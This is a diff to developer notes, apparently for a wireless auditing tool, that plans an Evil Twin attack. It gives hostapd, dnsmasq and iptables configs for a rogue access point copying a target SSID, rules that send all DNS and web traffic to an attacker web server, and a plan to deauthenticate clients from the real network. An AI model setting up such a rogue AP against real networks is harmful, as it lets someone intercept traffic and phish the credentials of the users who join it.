@@ -60,9 +60,108 @@ I think steps 3-5 can be applied to a specific wireless card (interface).
    * Yes, looks like that's what Fluxion does ([code](https://github.com/FluxionNetwork/fluxion/blob/16965ec192eb87ae40c211d18bf11bb37951b155/lib/ap/hostapd.sh#L66-L74)).
 
 
+ROGUE AP
+========
+Gleaned this info from:
+
+* ["Setting up wireless access point in Kali"](https://www.psattack.com/articles/20160410/setting-up-a-wireless-access-point-in-kali/) by PSAttack
+* ["Kali Linux Evil Wireless Access Point"](https://www.offensive-security.com/kali-linux/kali-linux-evil-wireless-access-point/) by OffensiveSecurity
+
+
+HOSTAPD
+-------
+* Starts access point.
+* Not included in Kali by-default.
+* Installable via `apt-get install hostapd`.
+* [Docs](https://wireless.wiki.kernel.org/en/users/documentation/hostapd)
+
+Config file format (e.g. `~/hostapd.conf`):
+
+```
+driver=nl80211   # 'nl80211' appears in all hostapd tutorials I've found.
+ssid=$EVIL_SSID  # SSID/name of Evil Twin (should match target's)
+hw_mode=$BAND    # Wifi Band, e.g. "g" or "g+n"
+channel=$CHANNEL # Numeric, e.g. "6'
+```
+
+Run:
+
+```
+hostapd ~/hostapd.conf -i wlan0
+```
+
+
+DNSMASQ
+-------
+
+* Included in Kali.
+* Installable via `apt-get install dnsmasq`
+* Handles DNS and DHCP.
+* [Install & Overview](http://www.thekelleys.org.uk/dnsmasq/doc.html), [Manpage](http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html)
+
+Config file format (e.g. `~/dnsmasq.conf`):
+
+```
+interface=wlan0
+dhcp-range=10.0.0.10,10.0.0.250,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+#no-resolv
+server=8.8.8.8
+log-queries
+log-dhcp
+
+# Redirect all requests (# is wildcard) to IP of evil web server:
+# TODO: We should rely on iptables, right? Otherwise this redirects traffic from all ports...
+#address=/#/192.168.1.254
+```
+
+"DNS Entries" file format (`~/dns_entries`):
+
+```
+[DNS Name] [IP Address]
+# TODO: Are wildcards are supported?
+* 192.168.1.254 # IP of web server
+```
+
+Run:
+
+```
+dnsmasq -C ~/dnsmasq.conf -H ~/dns_entries
+```
+
+IPTABLES
+--------
+From [this thread on raspberrypi.org](https://www.raspberrypi.org/forums/viewtopic.php?p=288263&sid=b6dd830c0c241a15ac0fe6930a4726c9#p288263)
+
+> *Use iptables to redirect all traffic directed at port 80 to the http server on the Pi*
+> `sudo iptables -t nat -A PREROUTING -d 0/0 -p tcp –dport 80 -j DNAT –to 192.168.1.254:80`
+
+And from Andreas Wiese on [UnixExchange](https://unix.stackexchange.com/a/125300)
+
+> *You could get this with a small set of iptables rules redirecting all traffic to port 80 and 443 your AP's address:*
+> `# iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination localhost:80`
+> `# iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination localhost:80`
+
+TODO:
+
+* What about HTTPS traffic (port 443)?
+   * We want to avoid browser warnings (scary in Chrome & Firefox).
+
+
 DEAUTHING
 =========
-Easy to do using [MDK](https://tools.kali.org/wireless-attacks/mdk3) or `aireplay-ng`.
+While hosting the Evil Twin + Web Server, we need to deauthenticate clients from the target AP so they join the Evil Twin.
+
+Listening
+---------
+We need to listen for more clients and automatically start deauthing new clients as they appear.
+
+This might be supported by existing tools...
+
+MDK
+---
+Deauthing & DoS is easy to do using [MDK](https://tools.kali.org/wireless-attacks/mdk3) or `aireplay-ng`.
 
 I think MDK is a better tool for this job, but Wifite already requires the `aircrack` suite, so we should support both.
 
